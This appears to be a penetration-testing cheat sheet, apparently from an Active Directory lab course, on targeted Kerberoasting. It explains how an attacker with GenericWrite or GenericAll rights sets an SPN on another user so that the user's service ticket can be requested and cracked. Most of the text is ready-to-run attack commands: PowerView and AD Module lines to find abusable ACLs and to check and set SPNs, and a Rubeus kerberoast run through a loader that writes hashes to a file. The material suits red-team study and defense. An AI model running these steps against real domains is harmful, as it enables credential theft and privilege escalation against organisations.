**THE DEFINITION OF A SERVICE ACCOUNT IS ANY USER THAT HAS A SPN SET (NONE NULL)**

With enough rights (`GenericAll`/`GenericWrite`), a target user's SPN can
be set to anything (unique in the domain).

We can then request a TGS without special privileges. The TGS can then
be "Kerberoasted".

---
Find possible ACLs to abuse
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Check if the user has an SPN set (PowerView + AD Module)
```powershell
Get-DomainUser -Identity supportuser | select serviceprincipalname

Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

Set SPN for the user - **must be unique for the forest** (PowerView + AD Module)
```powershell
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/totallylegitSPN'}

Set-ADUser -Identity support1user -ServicePrincipalNames
@{Add=‘dcorp/whatever1'}
```

Kerberoast
```powershell
.\Loader.exe -path .\Rubeus.exe -args kerberoast /rc4opsec /outfile:hashes.txt
```